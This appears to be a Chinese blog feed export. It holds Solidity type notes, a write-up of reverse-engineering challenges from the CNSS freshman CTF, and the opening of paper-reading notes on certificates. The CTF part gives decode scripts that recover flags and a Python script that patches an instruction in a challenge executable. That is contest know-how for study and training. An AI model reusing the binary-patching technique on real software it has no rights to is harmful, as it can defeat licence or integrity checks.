<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> SPDX-License-Identifier: GPL-<span class="number">3.0</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.4</span>.<span class="number">0</span> &lt;<span class="number">0.9</span>.<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; <span class="regexp">//</span> 枚举</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="类型">类型</h1>
<h2 id="值类型">值类型</h2>
<p>以下类型也称为值类型，因为这些类型的变量将始终按值来传递。
也就是说，当这些变量被用作函数参数或者用在赋值语句中时，总会进行值拷贝。</p>
<h3 id="布尔类型">布尔类型</h3>
<p><code>bool</code> ：可能的取值为字面常数值 <code>true</code> 和
<code>false</code></p>
<p>运算符：</p>
<ul>
<li><code>!</code> （逻辑非）</li>
<li><code>&amp;&amp;</code> （逻辑与， "and" ）</li>
<li><code>||</code> （逻辑或， "or" ）</li>
<li><code>==</code> （等于）</li>
<li><code>!=</code> （不等于）</li>
</ul>
<p>其中与和或都遵循短路原则</p>
<h3 id="整型">整型</h3>
<p><code>int</code> / <code>uint</code>
：分别表示有符号和无符号的不同位数的整型变量。 支持关键字
<code>uint8</code> 到 <code>uint256</code> （无符号，从 8 位到 256
位）以及 <code>int8</code> 到 <code>int256</code>，以 <code>8</code>
位为步长递增。 <code>uint</code> 和 <code>int</code> 分别是
<code>uint256</code> 和 <code>int256</code> 的别名。</p>
<p>运算符：</p>
<ul>
<li>比较运算符： <code>&lt;=</code> ， <code>&lt;</code> ，
<code>==</code> ， <code>!=</code> ， <code>&gt;=</code> ，
<code>&gt;</code> （返回布尔值）</li>
<li>位运算符： <code>&amp;</code> ， <code>|</code> ， <code>^</code>
（异或）， <code>~</code> （位取反）</li>
<li>算数运算符： <code>+</code> ， <code>-</code> ， 一元运算
<code>-</code> （仅针对有符号整数）， <code>*</code> ， <code>/</code>
， <code>%</code> （取余） ， <code>**</code> （幂），
<code>&lt;&lt;</code> （左移位） ， <code>&gt;&gt;</code>
（右移位）</li>
</ul>
<p>对于一个整数类型X，你可以使用type(X).min和type(X).max来访问该类型可表示的最小和最大值。</p>
<h3 id="位操作">位操作</h3>
<p>位操作是在数字的补码进行的。这意味着，例如<code>~int256(0) == int256(-1)</code></p>
<h3 id="移位">移位</h3>
<p>移位操作的结果将截断成左操作数的类型；右操作数必须是无符号类型，否则会产生编译错误。</p>
<ul>
<li><p><code>x &lt;&lt; y</code> 等价于<code>x * 2**y</code>.</p></li>
<li><p><code>x &gt;&gt; y</code>等价于<code>x / 2**y</code>，向负无穷取整</p></li>
<li><p>在<code>0.5.0</code>版本之前，负数x的右移<code>x&gt;&gt;y</code>相当于数学表达式<code>x/2**y</code>向零舍入，即右移使用向上取整（向零）而不是向下取整（向负无穷）。</p></li>
</ul>
<p>ps：对移位操作从不进行溢出检查，就像对算术操作那样。相反，结果总是被截断的。</p>
<h3 id="加减乘">加减乘</h3>
<p>加法、减法和乘法具有通常的语义，在溢出和下溢方面有两种不同的模式：</p>
<p>默认情况下，所有的算术都会被检查是否有下溢，但这可以通过unchecked块来禁用，从而导致包装算术。更多的细节可以在该部分找到。</p>
<p>表达式-x相当于（T(0) -
x），其中T是x的类型。如果x是负的，-x的值可以是正的。还有一个注意事项也是由补码引起的：</p>
<p><code>如果你有int x = type(int).min;，那么-x就不符合正的范围。这意味着未经检查的&#123; assert(-x == x); &#125;是有效的，而表达式-x在检查模式下使用时将导致一个失败的断言。</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    int256 public a;</span><br><span class="line">    int256 public b;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        a = type(int256).min;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            b = -a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function compare() public view returns(bool) &#123;</span><br><span class="line">        bool jdg = (a==b);</span><br><span class="line">        return jdg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../images/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20230517153400833.png" alt="image-20230517153400833"></p>
<h3 id="除">除</h3>
<p>由于运算结果的类型总是操作数之一的类型，整数除法的结果总是一个整数。在Solidity中，除法是向零进位的。这意味着<code>int256(-5) / int256(2) == int256(-2)</code>。</p>
<p>请注意，与此相反，在字面量（literals）上除法的结果是任意精度的小数值。</p>
<p>除以0为导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p>
<p><code>type(int).min / (-1)</code>这个表达式是除法导致上溢的唯一情况</p>
<h3 id="模">模</h3>
<p>模操作<code>a % n</code>产生操作数<code>a</code>除以操作数<code>n</code>后的余数<code>r</code>，其中<code>q = int(a / n)，r = a - (n * q)</code>。这意味着模运算的结果与它的左边操作数（或零）相同，<code>a % n == -(-a % n)</code>对负数<code>a</code>成立：</p>
<ul>
<li><code>int256(5) % int256(2) == int256(1)</code></li>
<li><code>int256(5) % int256(-2) == int256(1)</code></li>
<li><code>int256(-5) % int256(2) == int256(-1)</code></li>
<li><code>int256(-5) % int256(-2) == int256(-1)</code></li>
</ul>
<p>模0会导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p>
<h3 id="幂">幂</h3>
<p>建议用<code>x*x*x</code>来代替<code>x**3</code>来减少gas消耗</p>
<p>EVM定义<code>0**0=1</code></p>
<h3 id="地址">地址</h3>
<p>地址有两种：</p>
<ul>
<li><p><code>address</code>:
保存一个20字节的值（以太坊地址的大小）。</p></li>
<li><p><code>address payable</code>:
与<code>address</code>相同，但有额外的方法<code>transfer</code>和<code>send</code>。</p>
<p><code>payable address</code>到<code>address</code>是可以隐式转换的，但<code>address</code>到<code>payable address</code>必须通过显式转换：<code>payable(&lt;address&gt;)</code></p>
<p><code>uint160</code>，整数字面量、<code>bytes20</code>和合约类型都可以和<code>address</code>进行显式转换</p>
<p>只有<code>address</code>和合约类型可以通过<code>payable</code>转换成<code>address payable</code>。对于一个合约类型，只有它可以接收以太币或存在一个<code>payable fallback function</code>才可以完成转换。注意
<code>payable(0)</code>是许可的。</p></li>
</ul>
<p>注意：</p>
<ol type="1">
<li>如果你需要一个<code>address</code>类型的变量，并计划向其发送以太币，那么请将其类型声明为<code>payable address</code></li>
<li><code>address</code>和<code>address payable</code>的区别在<strong>0.5.0</strong>版本中引入的。同样从该版本开始，合约不能隐含地转换为<code>address</code>类型。但如果它们有一个接收或<code>payable fallback function</code>，仍然可以显式地转换为<code>address</code>或<code>address payable</code>。</li>
</ol>
<p>如果把一个较大的bytes转换成一个<code>address</code>，例如<code>bytes32</code>，那么<code>address</code>将被截断。例如，<code>b = '0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC'</code>:</p>
<ul>
<li><code>address(uint160(bytes20(b))) = 0x111122223333444455556666777788889999aAaa</code></li>
<li><code>address(uint160(uint256(b))) = 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</code></li>
</ul>
<h3 id="地址成员">地址成员</h3>
<ul>
<li><p><code>balance</code> 和 <code>transfer</code></p>
<p>查询某个地址的余额使用balance，向某个payable
address发送以太币（wei为单位）使用transfer：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address payable x = payable(0x123);</span><br><span class="line">address myAddress = address(this);</span><br><span class="line">if (x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10) x.transfer(10);</span><br></pre></td></tr></table></figure>
<p>如果x是一个合约地址，它的代码（实际上是接受以太坊的函数，或<code>Fallback</code>函数）会连同<code>transfer</code>一起执行。这是EVM的一个特性，无法被阻止。如果这段执行将gas消耗完或其他原因失败，<code>transfer</code>就会被回退</p></li>
<li><p><code>send</code></p>
<p><code>send</code>是低级别的<code>transfer</code>，如果执行失败则会返回<code>false</code>而不是回退</p>
<p>使用<code>send</code>有一些危险：
如果调用堆栈深度为1024，转账就会失败（这可以由调用者强制执行），如果接收者没有<code>gas</code>了，也会失败。因此，为了安全地进行以太币转账，一定要检查<code>send</code>的返回值、使用<code>transfer</code>，甚至更好的是：使用收款人取款的模式</p></li>
<li><p><code>call</code>, <code>delegatecall</code> 和
<code>staticcall</code></p>
<p>为了与不遵守ABI的合约交互，或者为了更直接地控制编码，我们提供了函数<code>call</code>、<code>delegatecall</code>和<code>staticcall</code>。它们都接受一个字节的内存参数，并返回成功条件（作为一个<code>bool</code>）和返回的数据（字节内存）。函数<code>abi.encode</code>,
<code>abi.encodePacked</code>,
<code>abi.encodeWithSelector</code>和<code>abi.encodeWithSignature</code>可用于编码结构化数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;);</span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line">require(success);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>可以调节gas消耗量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li>
<li><p>以太币也可以调节：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li>
<li><p>甚至是组合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000, value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li>
</ul>
<p>同样的，<code>delegatecall</code>也可以被这样使用，但不同的点在于：执行环境为当前合约的环境，目标合约地址只是被调用，<code>delegatecall</code>的目的是为了使用在另一个合约中的库代码</p>
<p><code>staticcall</code>与<code>call</code>相似，但它会在调用的函数改变状态后<code>revert</code></p>
<p>所有这三个函数<code>call</code>, <code>delegatecall</code> 和
<code>staticcall</code>都是非常低级的函数，只应该作为最后的手段使用，因为它们破坏了Solidity的类型安全。</p>
<p><code>gas</code>选项在所有三种方法中都免费，而<code>value</code>选项只在<code>call</code>中免费。</p></li>
<li><p><code>code</code> 和<code>codehash</code></p>
<p>可以查询任何智能合约的部署代码。使用<code>.code</code>来获取<code>EVM</code>字节码，作为字节内存，它可能是空的。使用<code>.codehash</code>获得该代码的<code>Keccak-256</code>哈希值（作为<code>bytes32</code>）。注意，<code>addr.codehash</code>比使用<code>keccak256(addr.code)</code>更便宜。</p>
<p>所有的合同都可以转换为<code>address</code>类型，所以可以用<code>address(this).balance</code>查询当前合同的余额。</p></li>
</ul>
<h3 id="合约类型">合约类型</h3>
<p>每个合约都有自己的类型，它可以通过<code>adress(x)</code>显式地转化成<code>address</code>类型；如果合约中存在<code>receive</code>或<code>payable fallback</code>函数，则能转换成<code>payable address</code>类型；否则需要用<code>payable(address(x))</code>来转换。</p>
<p>注意：在<code>0.5.0</code>版本以前，<code>address</code>和<code>payable address</code>没有区别。</p>
<p>合约的数据表示与地址类型相同，这种类型也在<code>ABI</code>中使用。</p>
<p>合约不支持任何操作符。</p>
<p>合约的成员包括合约的<code>public</code>函数和任何标记<code>public</code>的状态变量。</p>
<p>对于一个合约<code>c</code>，你可以使用<code>type(c)</code>来访问合同的类型信息。</p>
<h3 id="定长字节数组">定长字节数组</h3>
<p><code>bytes1, bytes2, bytes3, ..., bytes32</code>保存一串从1到32的字节。</p>
<p>操作符：</p>
<ul>
<li>比较： <code>&lt;=</code>, <code>&lt;</code>, <code>==</code>,
<code>!=</code>, <code>&gt;=</code>, <code>&gt;</code> (评估为bool)</li>
<li>比特运算符：<code>&amp;</code>, <code>|</code>, <code>^</code>
(bit异或), <code>~</code> (比特取反)</li>
<li>移位运算符：
<code>&lt;&lt;</code>（左移），<code>&gt;&gt;</code>（右移）</li>
<li>索引访问：
如果<code>x</code>是<code>bytesI</code>类型的，那么<code>x[k]</code>对于<code>0 &lt;= k &lt; I</code>返回第<code>k</code>个字节（只读）。</li>
</ul>
<p>成员：</p>
<ul>
<li><code>.length</code> 返回定长数组的长度（只读）</li>
</ul>
<p>注意：<code>bytes1[]</code>类型是一个字节数组，但是由于填充规则，它为每个元素浪费了31个字节的空间（除了在存储中）。最好使用<code>bytes</code>类型来代替。</p>
<p>注意：在<code>0.8.0</code>版本之前，<code>byte</code>曾经是<code>bytes1</code>的别名。</p>
<h3 id="变长字节数组">变长字节数组</h3>
<p><code>bytes</code>和<code>string</code></p>
<h3 id="地址字面量">地址字面量</h3>
<p>以<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md">EIP-55</a>.为标准，不通过校验将无法成为地址</p>
<h3 id="有理数和整数字面量">有理数和整数字面量</h3>
<p>小数点字面量是由<code>.</code>与小数点后的至少一个数字组成。例子包括<code>.1</code>和<code>1.3</code>（但不能是<code>1.</code>）。也支持科学计数法，字面量MeE等价于<code>M*10**E</code>，指数部分必须是整数，尾数可以是小数。</p>
<p>下划线可用来提高代码可读性，没有其他任何意义。例如，十进制123_000，十六进制0x2eff_abde，科学十进制符号1_2e345_678都是有效的。下划线只允许在两个数字之间，并且只允许一个连续的下划线。</p>
<p>数字字面表达式保留了任意精度，直到被转换成其他非字面类型（即通过与数字字面表达式以外的其他东西一起使用（如布尔字面）或显式转换）。在数字字面表达式中，计算不会溢出，除法不会截断。例如，<code>2**800+1-2**800</code>在字面量中是允许的。<code>.5*8</code>的结果是整型的<code>4</code>。</p>
<p>只要操作数是整数，任何可以应用于整数的操作符也可以应用于数字字面表达式。如果两者中的任何一个是小数，则不允许进行位操作，如果指数是小数，则不允许进行指数化（因为这可能导致非有理数）。</p>
<p>以字面数为左（或基数）操作数，以整数类型为右（指数）操作数的移位和指数化，总是在<code>uint256</code>（对于非负的字面数字）或<code>int256</code>（对于负的字面数字）类型中进行，与右（指数）操作数的类型无关。</p>
<p>在<code>0.4.0</code>之前，整数的字面量会被截断即<code>5/2=2</code>，之后是<code>2.5</code></p>
<h3 id="字符字面量和类型">字符字面量和类型</h3>
<p>字符字面量可以分开写，例如<code>“foo""bar"</code>等价于<code>”foobar"</code>；并且<code>"foo"</code>只占用3个字节而不是4个字节（对比C语言的字符串以<code>"\0"</code>结尾）；它们可以隐式地转换成<code>bytes1</code>,
…,
<code>bytes32</code>；也可以转换成<code>bytes</code>和<code>string</code>。</p>
<p>字符字面量只能包含ASCII可打印字符，也就是0x20到0x7E；此外，也包括以下转义符：</p>
<ul>
<li><code>\&lt;newline&gt;</code> (转义实际换行)</li>
<li><code>\\</code> (反斜杠)</li>
<li><code>\'</code> (单引号)</li>
<li><code>\"</code> (双引号)</li>
<li><code>\n</code> (换行符)</li>
<li><code>\r</code> (回车)</li>
<li><code>\t</code> (标签 tab)</li>
<li><code>\xNN</code> (十六进制转义，表示一个十六进制的值，)</li>
<li><code>\uNNNN</code> (unicode 转义，转换成UTF-8的序列)</li>
</ul>
<p>注意：直到0.8.0才推出：<code>\b</code>（退格）、<code>\f</code>（换页）、<code>\v</code>（垂直标签）；但如果实在需要用到，可以通过十六进制转义插入，即分别为<code>\x08</code>、<code>\x0c</code>和<code>\x0b</code>。</p>
<p>任何unicode行终结符（除了LF，VF，FF，CR，NEL，LS，PS）都可以当成字符串字面常量的终止符。
只有当字符串字面常量前没有<code>\</code>时，换行符才能终止字符串字面常量。</p>
<h3 id="unicode字面量">Unicode字面量</h3>
<p>Unicode字面量—以<code>unicode</code>开头—可以包含所有有效的UTF-8字符，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string memory a = unicode&quot;Hello 😃&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="十六进制字面量">十六进制字面量</h3>
<p>以"hex"开头，紧跟单引号或双引号字符串： <code>hex"001122FF"</code>,
<code>hex'0011_22_FF'</code>，可以使用下划线作为字符的分隔符。</p>
<p>用空格分隔的十六进制字面量将表达成一个拼接起来的十六进制字面量：<code>hex"00112233" hex"44556677"</code>
等价于 <code>hex"0011223344556677"</code></p>
<p>十六进制字面量不能隐式转换成字符字面量</p>
<h3 id="枚举">枚举</h3>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>cnss_re</title>
    <url>/2023/08/16/2023/cnss-re/</url>
    <content><![CDATA[<p>CNSS新生赛的逆向题题解</p>
<span id="more"></span>
<h1 id="reverse-guideline">Reverse Guideline</h1>
<p>教程，直接拿到flag</p>
<h1 id="welcome-to-reverse-world">Welcome to Reverse World!</h1>
<p>用ida打开即可看到flag</p>
<h1 id="find-me">Find me</h1>
<p>用ida看伪代码，介绍从三个方向去找flag：string、function和xref</p>
<p>shift-f12查看字符串找到第一部分</p>
<p><img src="/images/cnss-re/image-20230816194830839.png" alt="image-20230816194830839" style="zoom:50%;"></p>
<p>左侧函数框最上方看到第二部分</p>
<p><img src="/images/cnss-re/image-20230816194850994.png" alt="image-20230816194850994" style="zoom:50%;"></p>
<p>选中函数按x查看交叉引用</p>
<p><img src="/images/cnss-re/image-20230816194936131.png" alt="image-20230816194936131" style="zoom:50%;"></p>
<p>按r把数字变成字符</p>
<p>最后拼接flag</p>
<h1 id="maware">maware</h1>
<p>查看代码逻辑，先对输入异或，encode函数里是每四字节输入把bit置换，结果要求等于一个给定数组(shift+e导出数据)</p>
<p>写一个逆脚本即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> <span class="type">char</span> *a3, <span class="type">unsigned</span> <span class="type">char</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v6; <span class="comment">// [rsp+2Dh] [rbp-3h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v7; <span class="comment">// [rsp+2Eh] [rbp-2h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v8; <span class="comment">// [rsp+2Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    v5 = (*a1 &lt;&lt; <span class="number">7</span>) | (*a2 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    v6 = ((*a4 &gt;&gt; <span class="number">2</span>) | (*a3 &lt;&lt; <span class="number">6</span>)) ^ v5;</span><br><span class="line">    v7 = ((*a1 &gt;&gt; <span class="number">1</span>) | (*a2 &lt;&lt; <span class="number">7</span>)) ^ v6;</span><br><span class="line">    v8 = ((*a3 &gt;&gt; <span class="number">2</span>) | (*a4 &lt;&lt; <span class="number">6</span>)) ^ v7;</span><br><span class="line">    *a1 = v5;</span><br><span class="line">    *a2 = v6;</span><br><span class="line">    *a3 = v7;</span><br><span class="line">    *a4 = v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> <span class="type">char</span> *a3, <span class="type">unsigned</span> <span class="type">char</span> *a4)</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> m1, m2, m3, m4;</span><br><span class="line">    m1 = *a1;</span><br><span class="line">    m2 = *a2 ^ *a1;</span><br><span class="line">    m3 = *a3 ^ *a2;</span><br><span class="line">    m4 = *a4 ^ *a3;</span><br><span class="line">    </span><br><span class="line">    *a4 = ((m2 &lt;&lt; <span class="number">2</span>) | (m4 &gt;&gt; <span class="number">6</span>));</span><br><span class="line">    *a3 = ((m4 &lt;&lt; <span class="number">2</span>) | (m2 &gt;&gt; <span class="number">6</span>));</span><br><span class="line">    *a2 = ((m1 &lt;&lt; <span class="number">1</span>) | (m3 &gt;&gt; <span class="number">7</span>));</span><br><span class="line">    *a1 = ((m3 &lt;&lt; <span class="number">1</span>) | (m1 &gt;&gt; <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cipher[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x3F</span>, <span class="number">0x8F</span>, <span class="number">0xA3</span>, <span class="number">0xBC</span>, <span class="number">0x8D</span>, <span class="number">0x27</span>, <span class="number">0x7A</span>, <span class="number">0x67</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, </span><br><span class="line">        <span class="number">0xA2</span>, <span class="number">0xE0</span>, <span class="number">0xAC</span>, <span class="number">0xEA</span>, <span class="number">0x95</span>, <span class="number">0x8B</span>, <span class="number">0xA3</span>, <span class="number">0xED</span>, <span class="number">0xCC</span>, <span class="number">0xB6</span>, </span><br><span class="line">        <span class="number">0x32</span>, <span class="number">0x8C</span>, <span class="number">0x94</span>, <span class="number">0x52</span>, <span class="number">0x82</span>, <span class="number">0x8A</span>, <span class="number">0x14</span>, <span class="number">0xC6</span>, <span class="number">0xF5</span>, <span class="number">0xAE</span>, </span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">28</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        decode(&amp;cipher[i], &amp;cipher[i+<span class="number">1</span>], &amp;cipher[i+<span class="number">2</span>], &amp;cipher[i+<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)&#123;</span><br><span class="line">        cipher[i] ^= <span class="number">0x11</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cipher[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="encode">encode</h1>
<p>代码逻辑是输入一个字符串，经过encode函数后要求等于一个给定的字符串</p>
<p><img src="/images/cnss-re/image-20230816195750648.png" alt="image-20230816195750648" style="zoom:50%;"></p>
<p>encode函数是每三个字符进行处理，一开始没看懂，把61那里变成字符('=')后大概猜到了是base64，里面的alpha数组确实是个表，但是和标准的表不一样，写个脚本就可解密</p>
<h1 id="youve-got-a-flag">You've got a flag!</h1>
<p>考点是patch程序</p>
<p>流程是要求让coin小于0，每轮coin会自减去1/4，但是小于一个值的时候就会加上1</p>
<p>查看指令后是用addsd实现的，那么很显然就会想到把它改成subsd即可</p>
<p>在option-general可以选择查看字节码，再在网上搜对应subsd的字节码即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_machine_code</span>(<span class="params">filename, original_code, new_code</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> original_code <span class="keyword">in</span> content:</span><br><span class="line">        modified_content = content.replace(original_code, new_code)</span><br><span class="line">        <span class="comment"># print(&quot;机器码找到了&quot;)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(modified_content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;机器码修改成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到原始机器码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">filename = <span class="string">&quot;You&#x27;ve got a flag!.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始机器码</span></span><br><span class="line">original_code = <span class="string">b&quot;\xF2\x0F\x5B\xC8&quot;</span></span><br><span class="line"><span class="comment"># 新的机器码</span></span><br><span class="line">new_code = <span class="string">b&quot;\xF2\x0F\x5C\xC8&quot;</span></span><br><span class="line"></span><br><span class="line">modify_machine_code(filename, original_code, new_code)</span><br></pre></td></tr></table></figure>
<h1 id="diannaobaozhale">diannaobaozhale</h1>
<p>考点是看汇编指令</p>
<p>其实整个流程就是把flag输出了，照着走一遍即可，坑的话可能就是jle这个指令的意思是Jump
if Less than or Equal，所以程序一共要循环10次而不是9次</p>
<h1 id="pyfuck">Pyfuck</h1>
<p>考点算是变量混淆？把值变成了这个fuck的表示，打印一遍就知道是啥了，再异或回去即可</p>
<h1 id="cnss-rev-challenge">CNSS Rev Challenge</h1>
<p>c#写的一个小游戏，最后要把让看板娘跑到语句后面。</p>
<p>逆了半天也没发现怎么改配置文件，最后在hurrison的提示下，了解到可以在程序运行到那个阶段的时候查看内存，搜索字符串就能拿到flag了</p>
<p>用ida或cheat engine都可以</p>
<h1 id="ezarm">EzArm</h1>
<p>考点是arm逆向，出题人手写的arm汇编指令，太牛了</p>
<p>先装个qemu环境，用gdb调试程序，发现程序从最开始跳到了10000的地方，那么程序起始的地址应该是10000，然后就可以在ida中看到伪代码了，整个流程不难，经过某些运算后要等于一个数组，有个关键数组是动态生成的，所以ida里直接找不到，根据地址在gdb里查看即可</p>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret = [<span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x79</span>, <span class="number">0x7E</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x3D</span>, <span class="number">0x84</span>, <span class="number">0x55</span>, <span class="number">0x5F</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x6B</span>, <span class="number">0x79</span>, <span class="number">0x6B</span>, <span class="number">0x73</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x3D</span>, <span class="number">0x86</span>, </span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x46</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, <span class="number">0x48</span>, <span class="number">0x77</span>]</span><br><span class="line">x = [<span class="number">1</span>, <span class="number">0xc</span>, <span class="number">0xb</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1b</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((secret[i] - x[(i+<span class="number">1</span>)%<span class="number">3</span>]) % <span class="number">256</span>) ^x[i % <span class="number">3</span>]), end=<span class="string">&quot;&quot;</span> )</span><br></pre></td></tr></table></figure>
<h1 id="brainfuck">Brainfuck++</h1>
<p>不会</p>
<h1 id="eazy-blockchain">Eazy Blockchain</h1>
<p>evm逆向，给了bytecode和check函数</p>
<p>运行后90w行的调试信息，看关键逻辑，一共分为两部分。</p>
<p>这个地方是对输入的bytes进行判断，如果长度不是0x20就revert了，所以可以得知flag是32字节的.</p>
<p><img src="/images/cnss-re/image-20230821105646840.png" alt="image-20230821105646840" style="zoom:50%;"></p>
<p>后面就是漫长的审代码，这里把calldata存到栈里：</p>
<p><img src="/images/cnss-re/image-20230821105908007.png" alt="image-20230821105908007" style="zoom:50%;"></p>
<p>接下来是一个字节一个字节的加密操作，第一步的加密是用8字节的key对输入进行异或操作，把几个key找到后就可恢复这一部分。</p>
<p>第二部分和第一部分类似，但我实在是累的一，这已经到90多万行，不想再一个个调，发现逻辑也是异或后，直接写了个shell脚本进行字节翻转，但没有完全自动化，最后还是手调的flag。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">rm output.txt</span><br><span class="line">python demo.py &gt; output.txt</span><br><span class="line">grep &quot;EQ&quot; output.txt | wc -l</span><br><span class="line">grep -B 4 &quot;EQ&quot; output.txt | grep -v &quot;^--$&quot; | tail -n 3 | head -n 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后到return就代表跑通了</p>
<p><img src="/images/cnss-re/image-20230821110811948.png" alt="image-20230821110811948" style="zoom:50%;"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
        <tag>arm</tag>
        <tag>galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>证书论文阅读笔记</title>
    <url>/2023/08/21/2023/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>开摆</p>
<span id="more"></span>
<h1 id="re-check-your-certificates-experiences-and-lessons-learnt-from-real-world-https-certificate-deployments">Re-check
Your Certificates! Experiences and Lessons Learnt from Real-world HTTPS
Certificate Deployments</h1>
